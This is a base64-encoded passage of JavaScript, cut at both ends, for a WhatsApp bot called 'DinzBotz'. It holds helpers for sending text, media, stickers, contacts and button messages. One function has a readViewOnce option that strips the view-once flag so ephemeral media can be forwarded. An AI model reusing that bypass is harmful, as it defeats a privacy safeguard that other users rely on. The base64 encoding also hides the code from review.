nJlYWRNZXNzYWdlcyhba2F5LmtleV0pIH0KaWYgKCFEaW56Qm90ei5wdWJsaWMgJiYgIWtheS5rZXkuZnJvbU1lICYmIGNoYXRVcGRhdGUudHlwZSA9PT0gJ25vdGlmeScpIHJldHVybgppZiAoa2F5LmtleS5pZC5zdGFydHNXaXRoKCdCQUU1JykgJiYga2F5LmtleS5pZC5sZW5ndGggPT09IDE2KSByZXR1cm4KY29uc3QgbSA9IHNtc2coRGluekJvdHosIGtheSwgc3RvcmUpCnJlcXVpcmUoJy4vRGlueklEJykoRGluekJvdHosIG0sIGNoYXRVcGRhdGUsIHN0b3JlKQp9IGNhdGNoIChlcnIpIHsKY29uc29sZS5sb2coZXJyKX19KQoKICAgIGFzeW5jIGZ1bmN0aW9uIGdldE1lc3NhZ2Uoa2V5KXsKICAgICAgICBpZiAoc3RvcmUpIHsKICAgICAgICAgICAgY29uc3QgbXNnID0gYXdhaXQgc3RvcmUubG9hZE1lc3NhZ2Uoa2V5LnJlbW90ZUppZCwga2V5LmlkKQogICAgICAgICAgICByZXR1cm4gbXNnPy5tZXNzYWdlCiAgICAgICAgfQogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgIGNvbnZlcnNhdGlvbjogIkRpbnogQm90IEFkYSBEaSBTaW5pIgogICAgICAgIH0KICAgIH0KICAgIERpbnpCb3R6LmV2Lm9uKCdtZXNzYWdlcy51cGRhdGUnLCBhc3luYyBjaGF0VXBkYXRlID0+IHsKICAgICAgICBmb3IoY29uc3QgeyBrZXksIHVwZGF0ZSB9IG9mIGNoYXRVcGRhdGUpIHsKCQkJaWYodXBkYXRlLnBvbGxVcGRhdGVzICYmICFrZXkuZnJvbU1lKSB7CgkJCQljb25zdCBwb2xsQ3JlYXRpb24gPSBhd2FpdCBnZXRNZXNzYWdlKGtleSkKCQkJCWlmKHBvbGxDcmVhdGlvbikgewoJCQkJICAgIGNvbnN0IHBvbGxVcGRhdGUgPSBhd2FpdCBnZXRBZ2dyZWdhdGVWb3Rlc0luUG9sbE1lc3NhZ2UoewoJCQkJCQkJbWVzc2FnZTogcG9sbENyZWF0aW9uLAoJCQkJCQkJcG9sbFVwZGF0ZXM6IHVwZGF0ZS5wb2xsVXBkYXRlcywKCQkJCQkJfSkKCSAgICAgICAgICAgICAgICB2YXIgdG9DbWQgPSBwb2xsVXBkYXRlLmZpbHRlcih2ID0+IHYudm90ZXJzLmxlbmd0aCAhPT0gMClbMF0/Lm5hbWUKCSAgICAgICAgICAgICAgICBpZiAodG9DbWQgPT0gdW5kZWZpbmVkKSByZXR1cm4KICAgICAgICAgICAgICAgICAgICB2YXIgcHJlZkNtZCA9IHByZWZpeCt0b0NtZAoJICAgICAgICAgICAgICAgIERpbnpCb3R6LmFwcGVuVGV4dE1lc3NhZ2UocHJlZkNtZCwgY2hhdFVwZGF0ZSkKCQkJCX0KCQkJfQoJCX0KICAgIH0pCgpEaW56Qm90ei5zZW5kVGV4dFdpdGhNZW50aW9ucyA9IGFzeW5jIChqaWQsIHRleHQsIHF1b3RlZCwgb3B0aW9ucyA9IHt9KSA9PiBEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIHsgdGV4dDogdGV4dCwgY29udGV4dEluZm86IHsgbWVudGlvbmVkSmlkOiBbLi4udGV4dC5tYXRjaEFsbCgvQChcZHswLDE2fSkvZyldLm1hcCh2ID0+IHZbMV0gKyAnQHMud2hhdHNhcHAubmV0JykgfSwgLi4ub3B0aW9ucyB9LCB7IHF1b3RlZCB9KQoKRGluekJvdHouZGVjb2RlSmlkID0gKGppZCkgPT4gewppZiAoIWppZCkgcmV0dXJuIGppZAppZiAoLzpcZCtAL2dpLnRlc3QoamlkKSkgewpsZXQgZGVjb2RlID0gamlkRGVjb2RlKGppZCkgfHwge30KcmV0dXJuIGRlY29kZS51c2VyICYmIGRlY29kZS5zZXJ2ZXIgJiYgZGVjb2RlLnVzZXIgKyAnQCcgKyBkZWNvZGUuc2VydmVyIHx8IGppZAp9IGVsc2UgcmV0dXJuIGppZAp9CgpEaW56Qm90ei5ldi5vbignY29udGFjdHMudXBkYXRlJywgdXBkYXRlID0+IHsKZm9yIChsZXQgY29udGFjdCBvZiB1cGRhdGUpIHsKbGV0IGlkID0gRGluekJvdHouZGVjb2RlSmlkKGNvbnRhY3QuaWQpCmlmIChzdG9yZSAmJiBzdG9yZS5jb250YWN0cykgc3RvcmUuY29udGFjdHNbaWRdID0geyBpZCwgbmFtZTogY29udGFjdC5ub3RpZnkgfQp9Cn0pCgpEaW56Qm90ei5nZXROYW1lID0gKGppZCwgd2l0aG91dENvbnRhY3QgID0gZmFsc2UpID0+IHsKaWQgPSBEaW56Qm90ei5kZWNvZGVKaWQoamlkKQp3aXRob3V0Q29udGFjdCA9IERpbnpCb3R6LndpdGhvdXRDb250YWN0IHx8IHdpdGhvdXRDb250YWN0IApsZXQgdgppZiAoaWQuZW5kc1dpdGgoIkBnLnVzIikpIHJldHVybiBuZXcgUHJvbWlzZShhc3luYyAocmVzb2x2ZSkgPT4gewp2ID0gc3RvcmUuY29udGFjdHNbaWRdIHx8IHt9CmlmICghKHYubmFtZSB8fCB2LnN1YmplY3QpKSB2ID0gRGluekJvdHouZ3JvdXBNZXRhZGF0YShpZCkgfHwge30KcmVzb2x2ZSh2Lm5hbWUgfHwgdi5zdWJqZWN0IHx8IFBob25lTnVtYmVyKCcrJyArIGlkLnJlcGxhY2UoJ0BzLndoYXRzYXBwLm5ldCcsICcnKSkuZ2V0TnVtYmVyKCdpbnRlcm5hdGlvbmFsJykpCn0pCmVsc2UgdiA9IGlkID09PSAnMEBzLndoYXRzYXBwLm5ldCcgPyB7CmlkLApuYW1lOiAnV2hhdHNBcHAnCn0gOiBpZCA9PT0gRGluekJvdHouZGVjb2RlSmlkKERpbnpCb3R6LnVzZXIuaWQpID8KRGluekJvdHoudXNlciA6CihzdG9yZS5jb250YWN0c1tpZF0gfHwge30pCnJldHVybiAod2l0aG91dENvbnRhY3QgPyAnJyA6IHYubmFtZSkgfHwgdi5zdWJqZWN0IHx8IHYudmVyaWZpZWROYW1lIHx8IFBob25lTnVtYmVyKCcrJyArIGppZC5yZXBsYWNlKCdAcy53aGF0c2FwcC5uZXQnLCAnJykpLmdldE51bWJlcignaW50ZXJuYXRpb25hbCcpCn0KCkRpbnpCb3R6LnBhcnNlTWVudGlvbiA9ICh0ZXh0ID0gJycpID0+IHsKcmV0dXJuIFsuLi50ZXh0Lm1hdGNoQWxsKC9AKFswLTldezUsMTZ9fDApL2cpXS5tYXAodiA9PiB2WzFdICsgJ0BzLndoYXRzYXBwLm5ldCcpCn0KCkRpbnpCb3R6LnNlbmRDb250YWN0ID0gYXN5bmMgKGppZCwga29uLCBxdW90ZWQgPSAnJywgb3B0cyA9IHt9KSA9PiB7CglsZXQgbGlzdCA9IFtdCglmb3IgKGxldCBpIG9mIGtvbikgewoJICAgIGxpc3QucHVzaCh7CgkgICAgCWRpc3BsYXlOYW1lOiBhd2FpdCBEaW56Qm90ei5nZXROYW1lKGkpLAoJICAgIAl2Y2FyZDogYEJFR0lOOlZDQVJEXG5WRVJTSU9OOjMuMFxuTjoke2F3YWl0IERpbnpCb3R6LmdldE5hbWUoaSl9XG5GTjoke2F3YWl0IERpbnpCb3R6LmdldE5hbWUoaSl9XG5pdGVtMS5URUw7d2FpZD0ke2l9OiR7aX1cbml0ZW0xLlgtQUJMYWJlbDpDbGljayBoZXJlIHRvIGNoYXRcbml0ZW0yLkVNQUlMO3R5cGU9SU5URVJORVQ6JHt5dG5hbWV9XG5pdGVtMi5YLUFCTGFiZWw6WW91VHViZVxuaXRlbTMuVVJMOiR7c29jaWFsbX1cbml0ZW0zLlgtQUJMYWJlbDpHaXRIdWJcbml0ZW00LkFEUjo7OyR7bG9jYXRpb259Ozs7O1xuaXRlbTQuWC1BQkxhYmVsOlJlZ2lvblxuRU5EOlZDQVJEYAoJICAgIH0pCgl9CglEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIHsgY29udGFjdHM6IHsgZGlzcGxheU5hbWU6IGAke2xpc3QubGVuZ3RofSBDb250YWN0YCwgY29udGFjdHM6IGxpc3QgfSwgLi4ub3B0cyB9LCB7IHF1b3RlZCB9KQogICAgfQoKRGluekJvdHouc2V0U3RhdHVzID0gKHN0YXR1cykgPT4gewpEaW56Qm90ei5xdWVyeSh7CnRhZzogJ2lxJywKYXR0cnM6IHsKdG86ICdAcy53aGF0c2FwcC5uZXQnLAp0eXBlOiAnc2V0JywKeG1sbnM6ICdzdGF0dXMnLAp9LApjb250ZW50OiBbewp0YWc6ICdzdGF0dXMnLAphdHRyczoge30sCmNvbnRlbnQ6IEJ1ZmZlci5mcm9tKHN0YXR1cywgJ3V0Zi04JykKfV0KfSkKcmV0dXJuIHN0YXR1cwp9CgpEaW56Qm90ei5wdWJsaWMgPSB0cnVlCgpEaW56Qm90ei5zZW5kSW1hZ2UgPSBhc3luYyAoamlkLCBwYXRoLCBjYXB0aW9uID0gJycsIHF1b3RlZCA9ICcnLCBvcHRpb25zKSA9PiB7CmxldCBidWZmZXIgPSBCdWZmZXIuaXNCdWZmZXIocGF0aCkgPyBwYXRoIDogL15kYXRhOi4qP1wvLio/O2Jhc2U2NCwvaS50ZXN0KHBhdGgpID8gQnVmZmVyLmZyb20ocGF0aC5zcGxpdGAsYFsxXSwgJ2Jhc2U2NCcpIDogL15odHRwcz86XC9cLy8udGVzdChwYXRoKSA/IGF3YWl0IChhd2FpdCBnZXRCdWZmZXIocGF0aCkpIDogZnMuZXhpc3RzU3luYyhwYXRoKSA/IGZzLnJlYWRGaWxlU3luYyhwYXRoKSA6IEJ1ZmZlci5hbGxvYygwKQpyZXR1cm4gYXdhaXQgRGluekJvdHouc2VuZE1lc3NhZ2UoamlkLCB7IGltYWdlOiBidWZmZXIsIGNhcHRpb246IGNhcHRpb24sIC4uLm9wdGlvbnMgfSwgeyBxdW90ZWQgfSkKfQoKRGluekJvdHouc2VuZEltYWdlQXNTdGlja2VyID0gYXN5bmMgKGppZCwgcGF0aCwgcXVvdGVkLCBvcHRpb25zID0ge30pID0+IHsKbGV0IGJ1ZmYgPSBCdWZmZXIuaXNCdWZmZXIocGF0aCkgPyBwYXRoIDogL15kYXRhOi4qP1wvLio/O2Jhc2U2NCwvaS50ZXN0KHBhdGgpID8gQnVmZmVyLmZyb20ocGF0aC5zcGxpdGAsYFsxXSwgJ2Jhc2U2NCcpIDogL15odHRwcz86XC9cLy8udGVzdChwYXRoKSA/IGF3YWl0IChhd2FpdCBnZXRCdWZmZXIocGF0aCkpIDogZnMuZXhpc3RzU3luYyhwYXRoKSA/IGZzLnJlYWRGaWxlU3luYyhwYXRoKSA6IEJ1ZmZlci5hbGxvYygwKQpsZXQgYnVmZmVyCmlmIChvcHRpb25zICYmIChvcHRpb25zLnBhY2tuYW1lIHx8IG9wdGlvbnMuYXV0aG9yKSkgewpidWZmZXIgPSBhd2FpdCB3cml0ZUV4aWZJbWcoYnVmZiwgb3B0aW9ucykKfSBlbHNlIHsKYnVmZmVyID0gYXdhaXQgaW1hZ2VUb1dlYnAoYnVmZikKfQphd2FpdCBEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIHsgc3RpY2tlcjogeyB1cmw6IGJ1ZmZlciB9LCAuLi5vcHRpb25zIH0sIHsgcXVvdGVkIH0pCi50aGVuKCByZXNwb25zZSA9PiB7CmZzLnVubGlua1N5bmMoYnVmZmVyKQpyZXR1cm4gcmVzcG9uc2UKfSkKfQoKRGluekJvdHouc2VuZFZpZGVvQXNTdGlja2VyID0gYXN5bmMgKGppZCwgcGF0aCwgcXVvdGVkLCBvcHRpb25zID0ge30pID0+IHsKbGV0IGJ1ZmYgPSBCdWZmZXIuaXNCdWZmZXIocGF0aCkgPyBwYXRoIDogL15kYXRhOi4qP1wvLio/O2Jhc2U2NCwvaS50ZXN0KHBhdGgpID8gQnVmZmVyLmZyb20ocGF0aC5zcGxpdGAsYFsxXSwgJ2Jhc2U2NCcpIDogL15odHRwcz86XC9cLy8udGVzdChwYXRoKSA/IGF3YWl0IChhd2FpdCBnZXRCdWZmZXIocGF0aCkpIDogZnMuZXhpc3RzU3luYyhwYXRoKSA/IGZzLnJlYWRGaWxlU3luYyhwYXRoKSA6IEJ1ZmZlci5hbGxvYygwKQpsZXQgYnVmZmVyCmlmIChvcHRpb25zICYmIChvcHRpb25zLnBhY2tuYW1lIHx8IG9wdGlvbnMuYXV0aG9yKSkgewpidWZmZXIgPSBhd2FpdCB3cml0ZUV4aWZWaWQoYnVmZiwgb3B0aW9ucykKfSBlbHNlIHsKYnVmZmVyID0gYXdhaXQgdmlkZW9Ub1dlYnAoYnVmZikKfQphd2FpdCBEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIHsgc3RpY2tlcjogeyB1cmw6IGJ1ZmZlciB9LCAuLi5vcHRpb25zIH0sIHsgcXVvdGVkIH0pCnJldHVybiBidWZmZXIKfQoKRGluekJvdHouY29weU5Gb3J3YXJkID0gYXN5bmMgKGppZCwgbWVzc2FnZSwgZm9yY2VGb3J3YXJkID0gZmFsc2UsIG9wdGlvbnMgPSB7fSkgPT4gewpsZXQgdnR5cGUKaWYgKG9wdGlvbnMucmVhZFZpZXdPbmNlKSB7Cm1lc3NhZ2UubWVzc2FnZSA9IG1lc3NhZ2UubWVzc2FnZSAmJiBtZXNzYWdlLm1lc3NhZ2UuZXBoZW1lcmFsTWVzc2FnZSAmJiBtZXNzYWdlLm1lc3NhZ2UuZXBoZW1lcmFsTWVzc2FnZS5tZXNzYWdlID8gbWVzc2FnZS5tZXNzYWdlLmVwaGVtZXJhbE1lc3NhZ2UubWVzc2FnZSA6IChtZXNzYWdlLm1lc3NhZ2UgfHwgdW5kZWZpbmVkKQp2dHlwZSA9IE9iamVjdC5rZXlzKG1lc3NhZ2UubWVzc2FnZS52aWV3T25jZU1lc3NhZ2UubWVzc2FnZSlbMF0KZGVsZXRlKG1lc3NhZ2UubWVzc2FnZSAmJiBtZXNzYWdlLm1lc3NhZ2UuaWdub3JlID8gbWVzc2FnZS5tZXNzYWdlLmlnbm9yZSA6IChtZXNzYWdlLm1lc3NhZ2UgfHwgdW5kZWZpbmVkKSkKZGVsZXRlIG1lc3NhZ2UubWVzc2FnZS52aWV3T25jZU1lc3NhZ2UubWVzc2FnZVt2dHlwZV0udmlld09uY2UKbWVzc2FnZS5tZXNzYWdlID0gewouLi5tZXNzYWdlLm1lc3NhZ2Uudmlld09uY2VNZXNzYWdlLm1lc3NhZ2UKfQp9CmxldCBtdHlwZSA9IE9iamVjdC5rZXlzKG1lc3NhZ2UubWVzc2FnZSlbMF0KbGV0IGNvbnRlbnQgPSBhd2FpdCBnZW5lcmF0ZUZvcndhcmRNZXNzYWdlQ29udGVudChtZXNzYWdlLCBmb3JjZUZvcndhcmQpCmxldCBjdHlwZSA9IE9iamVjdC5rZXlzKGNvbnRlbnQpWzBdCmxldCBjb250ZXh0ID0ge30KaWYgKG10eXBlICE9ICJjb252ZXJzYXRpb24iKSBjb250ZXh0ID0gbWVzc2FnZS5tZXNzYWdlW210eXBlXS5jb250ZXh0SW5mbwpjb250ZW50W2N0eXBlXS5jb250ZXh0SW5mbyA9IHsKLi4uY29udGV4dCwKLi4uY29udGVudFtjdHlwZV0uY29udGV4dEluZm8KfQpjb25zdCB3YU1lc3NhZ2UgPSBhd2FpdCBnZW5lcmF0ZVdBTWVzc2FnZUZyb21Db250ZW50KGppZCwgY29udGVudCwgb3B0aW9ucyA/IHsKLi4uY29udGVudFtjdHlwZV0sCi4uLm9wdGlvbnMsCi4uLihvcHRpb25zLmNvbnRleHRJbmZvID8gewpjb250ZXh0SW5mbzogewouLi5jb250ZW50W2N0eXBlXS5jb250ZXh0SW5mbywKLi4ub3B0aW9ucy5jb250ZXh0SW5mbwp9Cn0gOiB7fSkKfSA6IHt9KQphd2FpdCBEaW56Qm90ei5yZWxheU1lc3NhZ2UoamlkLCB3YU1lc3NhZ2UubWVzc2FnZSwgeyBtZXNzYWdlSWQ6ICB3YU1lc3NhZ2Uua2V5LmlkIH0pCnJldHVybiB3YU1lc3NhZ2UKfQoKRGluekJvdHouZG93bmxvYWRBbmRTYXZlTWVkaWFNZXNzYWdlID0gYXN5bmMgKG1lc3NhZ2UsIGZpbGVuYW1lLCBhdHRhY2hFeHRlbnNpb24gPSB0cnVlKSA9PiB7CmxldCBxdW90ZWQgPSBtZXNzYWdlLm1zZyA/IG1lc3NhZ2UubXNnIDogbWVzc2FnZQpsZXQgbWltZSA9IChtZXNzYWdlLm1zZyB8fCBtZXNzYWdlKS5taW1ldHlwZSB8fCAnJwpsZXQgbWVzc2FnZVR5cGUgPSBtZXNzYWdlLm10eXBlID8gbWVzc2FnZS5tdHlwZS5yZXBsYWNlKC9NZXNzYWdlL2dpLCAnJykgOiBtaW1lLnNwbGl0KCcvJylbMF0KY29uc3Qgc3RyZWFtID0gYXdhaXQgZG93bmxvYWRDb250ZW50RnJvbU1lc3NhZ2UocXVvdGVkLCBtZXNzYWdlVHlwZSkKbGV0IGJ1ZmZlciA9IEJ1ZmZlci5mcm9tKFtdKQpmb3IgYXdhaXQoY29uc3QgY2h1bmsgb2Ygc3RyZWFtKSB7CmJ1ZmZlciA9IEJ1ZmZlci5jb25jYXQoW2J1ZmZlciwgY2h1bmtdKQp9CmxldCB0eXBlID0gYXdhaXQgRmlsZVR5cGUuZnJvbUJ1ZmZlcihidWZmZXIpCnRydWVGaWxlTmFtZSA9IGF0dGFjaEV4dGVuc2lvbiA/IChmaWxlbmFtZSArICcuJyArIHR5cGUuZXh0KSA6IGZpbGVuYW1lCmF3YWl0IGZzLndyaXRlRmlsZVN5bmModHJ1ZUZpbGVOYW1lLCBidWZmZXIpCnJldHVybiB0cnVlRmlsZU5hbWUKfQoKRGluekJvdHouZG93bmxvYWRNZWRpYU1lc3NhZ2UgPSBhc3luYyAobWVzc2FnZSkgPT4gewpsZXQgbWltZSA9IChtZXNzYWdlLm1zZyB8fCBtZXNzYWdlKS5taW1ldHlwZSB8fCAnJwpsZXQgbWVzc2FnZVR5cGUgPSBtZXNzYWdlLm10eXBlID8gbWVzc2FnZS5tdHlwZS5yZXBsYWNlKC9NZXNzYWdlL2dpLCAnJykgOiBtaW1lLnNwbGl0KCcvJylbMF0KY29uc3Qgc3RyZWFtID0gYXdhaXQgZG93bmxvYWRDb250ZW50RnJvbU1lc3NhZ2UobWVzc2FnZSwgbWVzc2FnZVR5cGUpCmxldCBidWZmZXIgPSBCdWZmZXIuZnJvbShbXSkKZm9yIGF3YWl0KGNvbnN0IGNodW5rIG9mIHN0cmVhbSkgewpidWZmZXIgPSBCdWZmZXIuY29uY2F0KFtidWZmZXIsIGNodW5rXSkKfQpyZXR1cm4gYnVmZmVyCn0KCkRpbnpCb3R6LmdldEZpbGUgPSBhc3luYyAoUEFUSCwgc2F2ZSkgPT4gewpsZXQgcmVzCmxldCBkYXRhID0gQnVmZmVyLmlzQnVmZmVyKFBBVEgpID8gUEFUSCA6IC9eZGF0YTouKj9cLy4qPztiYXNlNjQsL2kudGVzdChQQVRIKSA/IEJ1ZmZlci5mcm9tKFBBVEguc3BsaXRgLGBbMV0sICdiYXNlNjQnKSA6IC9eaHR0cHM/OlwvXC8vLnRlc3QoUEFUSCkgPyBhd2FpdCAocmVzID0gYXdhaXQgZ2V0QnVmZmVyKFBBVEgpKSA6IGZzLmV4aXN0c1N5bmMoUEFUSCkgPyAoZmlsZW5hbWUgPSBQQVRILCBmcy5yZWFkRmlsZVN5bmMoUEFUSCkpIDogdHlwZW9mIFBBVEggPT09ICdzdHJpbmcnID8gUEFUSCA6IEJ1ZmZlci5hbGxvYygwKQpsZXQgdHlwZSA9IGF3YWl0IEZpbGVUeXBlLmZyb21CdWZmZXIoZGF0YSkgfHwgewptaW1lOiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKZXh0OiAnLmJpbid9CmZpbGVuYW1lID0gcGF0aC5qb2luKF9fZmlsZW5hbWUsICcuL2xpYicgKyBuZXcgRGF0ZSAqIDEgKyAnLicgKyB0eXBlLmV4dCkKaWYgKGRhdGEgJiYgc2F2ZSkgZnMucHJvbWlzZXMud3JpdGVGaWxlKGZpbGVuYW1lLCBkYXRhKQpyZXR1cm4gewpyZXMsCmZpbGVuYW1lLApzaXplOiBhd2FpdCBnZXRTaXplTWVkaWEoZGF0YSksCi4uLnR5cGUsCmRhdGF9fQoKRGluekJvdHouc2VuZE1lZGlhID0gYXN5bmMgKGppZCwgcGF0aCwgZmlsZU5hbWUgPSAnJywgY2FwdGlvbiA9ICcnLCBxdW90ZWQgPSAnJywgb3B0aW9ucyA9IHt9KSA9PiB7CmxldCB0eXBlcyA9IGF3YWl0IERpbnpCb3R6LmdldEZpbGUocGF0aCwgdHJ1ZSkKbGV0IHsgbWltZSwgZXh0LCByZXMsIGRhdGEsIGZpbGVuYW1lIH0gPSB0eXBlcwppZiAocmVzICYmIHJlcy5zdGF0dXMgIT09IDIwMCB8fCBmaWxlLmxlbmd0aCA8PSA2NTUzNikgewp0cnkgeyB0aHJvdyB7IGpzb246IEpTT04ucGFyc2UoZmlsZS50b1N0cmluZygpKSB9IH0KY2F0Y2ggKGUpIHsgaWYgKGUuanNvbikgdGhyb3cgZS5qc29uIH19CmxldCB0eXBlID0gJycsIG1pbWV0eXBlID0gbWltZSwgcGF0aEZpbGUgPSBmaWxlbmFtZQppZiAob3B0aW9ucy5hc0RvY3VtZW50KSB0eXBlID0gJ2RvY3VtZW50JwppZiAob3B0aW9ucy5hc1N0aWNrZXIgfHwgL3dlYnAvLnRlc3QobWltZSkpIHsKbGV0IHsgd3JpdGVFeGlmIH0gPSByZXF1aXJlKCcuL2xpYi9leGlmJykKbGV0IG1lZGlhID0geyBtaW1ldHlwZTogbWltZSwgZGF0YSB9CnBhdGhGaWxlID0gYXdhaXQgd3JpdGVFeGlmKG1lZGlhLCB7IHBhY2tuYW1lOiBvcHRpb25zLnBhY2tuYW1lID8gb3B0aW9ucy5wYWNrbmFtZSA6IGdsb2JhbC5wYWNrbmFtZSwgYXV0aG9yOiBvcHRpb25zLmF1dGhvciA/IG9wdGlvbnMuYXV0aG9yIDogZ2xvYmFsLmF1dGhvciwgY2F0ZWdvcmllczogb3B0aW9ucy5jYXRlZ29yaWVzID8gb3B0aW9ucy5jYXRlZ29yaWVzIDogW10gfSkKYXdhaXQgZnMucHJvbWlzZXMudW5saW5rKGZpbGVuYW1lKQp0eXBlID0gJ3N0aWNrZXInCm1pbWV0eXBlID0gJ2ltYWdlL3dlYnAnfQplbHNlIGlmICgvaW1hZ2UvLnRlc3QobWltZSkpIHR5cGUgPSAnaW1hZ2UnCmVsc2UgaWYgKC92aWRlby8udGVzdChtaW1lKSkgdHlwZSA9ICd2aWRlbycKZWxzZSBpZiAoL2F1ZGlvLy50ZXN0KG1pbWUpKSB0eXBlID0gJ2F1ZGlvJwplbHNlIHR5cGUgPSAnZG9jdW1lbnQnCmF3YWl0IERpbnpCb3R6LnNlbmRNZXNzYWdlKGppZCwgeyBbdHlwZV06IHsgdXJsOiBwYXRoRmlsZSB9LCBjYXB0aW9uLCBtaW1ldHlwZSwgZmlsZU5hbWUsIC4uLm9wdGlvbnMgfSwgeyBxdW90ZWQsIC4uLm9wdGlvbnMgfSkKcmV0dXJuIGZzLnByb21pc2VzLnVubGluayhwYXRoRmlsZSl9CgpEaW56Qm90ei5zZW5kVGV4dCA9IChqaWQsIHRleHQsIHF1b3RlZCA9ICcnLCBvcHRpb25zKSA9PiBEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIHsgdGV4dDogdGV4dCwgLi4ub3B0aW9ucyB9LCB7IHF1b3RlZCB9KQoKRGluekJvdHouc2VyaWFsaXplTSA9IChtKSA9PiBzbXNnKERpbnpCb3R6LCBtLCBzdG9yZSkKCkRpbnpCb3R6LmJlZm9yZSA9ICh0ZWtzKSA9PiBzbXNnKERpbnpCb3R6LCBtLCBzdG9yZSkKCkRpbnpCb3R6LnNlbmRCdXR0b25UZXh0ID0gKGppZCwgYnV0dG9ucyA9IFtdLCB0ZXh0LCBmb290ZXIsIHF1b3RlZCA9ICcnLCBvcHRpb25zID0ge30pID0+IHsKbGV0IGJ1dHRvbk1lc3NhZ2UgPSB7CnRleHQsCmZvb3RlciwKYnV0dG9ucywKaGVhZGVyVHlwZTogMiwKLi4ub3B0aW9ucwp9CkRpbnpCb3R6LnNlbmRNZXNzYWdlKGppZCwgYnV0dG9uTWVzc2FnZSwgeyBxdW90ZWQsIC4uLm9wdGlvbnMgfSkKfQoKRGluekJvdHouc2VuZEthdGFsb2cgPSBhc3luYyAoamlkICwgdGl0bGUgPSAnJyAsIGRlc2MgPSAnJywgZ2FtICwgb3B0aW9ucyA9IHt9KSA9PnsKbGV0IG1lc3NhZ2UgPSBhd2FpdCBwcmVwYXJlV0FNZXNzYWdlTWVkaWEoeyBpbWFnZTogZ2FtIH0sIHsgdXBsb2FkOiBEaW56Qm90ei53YVVwbG9hZFRvU2VydmVyIH0pCmNvbnN0IHRvZCA9IGdlbmVyYXRlV0FNZXNzYWdlRnJvbUNvbnRlbnQoamlkLAp7InByb2R1Y3RNZXNzYWdlIjogewoicHJvZHVjdCI6IHsKInByb2R1Y3RJbWFnZSI6IG1lc3NhZ2UuaW1hZ2VNZXNzYWdlLAoicHJvZHVjdElkIjogIjk5OTkiLAoidGl0bGUiOiB0aXRsZSwKImRlc2NyaXB0aW9uIjogZGVzYywKImN1cnJlbmN5Q29kZSI6ICJJTlIiLAoicHJpY2VBbW91bnQxMDAwIjogIjEwMDAwMCIsCiJ1cmwiOiBgJHt3ZWJzaXRleH1gLAoicHJvZHVjdEltYWdlQ291bnQiOiAxLAoic2FsZVByaWNlQW1vdW50MTAwMCI6ICIwIgp9LAoiYnVzaW5lc3NPd25lckppZCI6IGAke293bmVybnVtYmVyfUBzLndoYXRzYXBwLm5ldGAKfQp9LCBvcHRpb25zKQpyZXR1cm4gRGluekJvdHoucmVsYXlNZXNzYWdlKGppZCwgdG9kLm1lc3NhZ2UsIHttZXNzYWdlSWQ6IHRvZC5rZXkuaWR9KQp9IAoKRGluekJvdHouc2VuZDVCdXRMb2MgPSBhc3luYyAoamlkICwgdGV4dCA9ICcnICwgZm9vdGVyID0gJycsIGltZywgYnV0ID0gW10sIG9wdGlvbnMgPSB7fSkgPT57CnZhciB0ZW1wbGF0ZSA9IGdlbmVyYXRlV0FNZXNzYWdlRnJvbUNvbnRlbnQoamlkLCBwcm90by5NZXNzYWdlLmZyb21PYmplY3Qoewp0ZW1wbGF0ZU1lc3NhZ2U6IHsKaHlkcmF0ZWRUZW1wbGF0ZTogewoiaHlkcmF0ZWRDb250ZW50VGV4dCI6IHRleHQsCiJsb2NhdGlvbk1lc3NhZ2UiOiB7CiJqcGVnVGh1bWJuYWlsIjogaW1nIH0sCiJoeWRyYXRlZEZvb3RlclRleHQiOiBmb290ZXIsCiJoeWRyYXRlZEJ1dHRvbnMiOiBidXQKfQp9Cn0pLCBvcHRpb25zKQpEaW56Qm90ei5yZWxheU1lc3NhZ2UoamlkLCB0ZW1wbGF0ZS5tZXNzYWdlLCB7IG1lc3NhZ2VJZDogdGVtcGxhdGUua2V5LmlkIH0pCn0KZ2xvYmFsLkFQSSA9IChuYW1lLCBwYXRoID0gJy8nLCBxdWVyeSA9IHt9LCBhcGlrZXlxdWVyeW5hbWUpID0+IChuYW1lIGluIGdsb2JhbC5BUElzID8gZ2xvYmFsLkFQSXNbbmFtZV06IG5hbWUpICsgcGF0aCArIChxdWVyeSB8fCBhcGlrZXlxdWVyeW5hbWUgPyAnPycgKyBuZXcgVVJMU2VhcmNoUGFyYW1zKE9iamVjdC5lbnRyaWVzKHsKICAgIC4uLnF1ZXJ5LCAuLi4oYXBpa2V5cXVlcnluYW1lID8gewogICAgICAgIFthcGlrZXlxdWVyeW5hbWVdOiBnbG9iYWwuQVBJS2V5c1tuYW1lIGluIGdsb2JhbC5BUElzID8gZ2xvYmFsLkFQSXNbbmFtZV06IG5hbWVdCiAgICB9OiB7fSkKfSkpOiAnJykKCkRpbnpCb3R6LnNlbmRCdXRJbWcgPSBhc3luYyAoamlkLCBwYXRoLCB0ZWtzLCBma2UsIGJ1dCkgPT4gewpsZXQgaW1nID0gQnVmZmVyLmlzQnVmZmVyKHBhdGgpID8gcGF0aCA6IC9eZGF0YTouKj9cLy4qPztiYXNlNjQsL2kudGVzdChwYXRoKSA/IEJ1ZmZlci5mcm9tKHBhdGguc3BsaXRgLGBbMV0sICdiYXNlNjQnKSA6IC9eaHR0cHM/OlwvXC8vLnRlc3QocGF0aCkgPyBhd2FpdCAoYXdhaXQgZ2V0QnVmZmVyKHBhdGgpKSA6IGZzLmV4aXN0c1N5bmMocGF0aCkgPyBmcy5yZWFkRmlsZVN5bmMocGF0aCkgOiBCdWZmZXIuYWxsb2MoMCkKbGV0IGZqZWpmampqZXIgPSB7CmltYWdlOiBpbWcsIApqcGVnVGh1bWJuYWlsOiBpbWcsCmNhcHRpb246IHRla3MsCmZpbGVMZW5ndGg6ICIxIiwKZm9vdGVyOiBma2UsCmJ1dHRvbnM6IGJ1dCwKaGVhZGVyVHlwZTogNCwKfQpEaW56Qm90ei5zZW5kTWVzc2FnZShqaWQsIGZqZWpmampqZXIsIHsgcXVvdGVkOiBtIH0pCn0KCiAgICAgICAgICAgIC8qKgogICAgICAgICAgICAgKiBTZW5kIE1lZGlhL0ZpbGUgd2l0aCBBdXRvbWF0aWMgVHlwZSBTcGVjaWZpZXIKICAgICAgICAgICAgICogQHBhcmFtIHtTdHJpbmd9IGppZAogICAgICAgICAgICAgKiBAcGFyYW